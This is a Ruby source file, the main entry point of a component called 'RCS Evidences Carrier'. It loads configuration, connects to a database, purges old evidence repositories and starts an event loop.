#  The main file of the collector

require 'rcs-common/path_utils'

require_release 'rcs-collector/config'
require_release 'rcs-collector/db'
require_release 'rcs-collector/evidence_manager'

require_relative 'events'
require_relative 'evidence_transfer'

require 'rcs-common/trace'
require 'rcs-common/component'

require 'yaml'

module RCS
  module Carrier
    # namespace aliasing
    DB = RCS::Collector::DB
    Config = RCS::Collector::Config
    EvidenceManager = RCS::Collector::EvidenceManager

    class Application
      include RCS::Component

      component :carrier, name: "RCS Evidences Carrier"

      # the main of the collector
      def run(options)
        run_with_rescue do
          trace_setup

          # config file parsing
          return 1 unless Config.instance.load_from_file

          establish_database_connection(wait_until_connected: true)

          # compact or delete old repos
          EvidenceManager.instance.purge_old_repos

          # enter the main loop (hopefully will never exit from it)
          Events.new.setup
        end
      end
    end # Application::
  end # Carrier::
end # RCS::
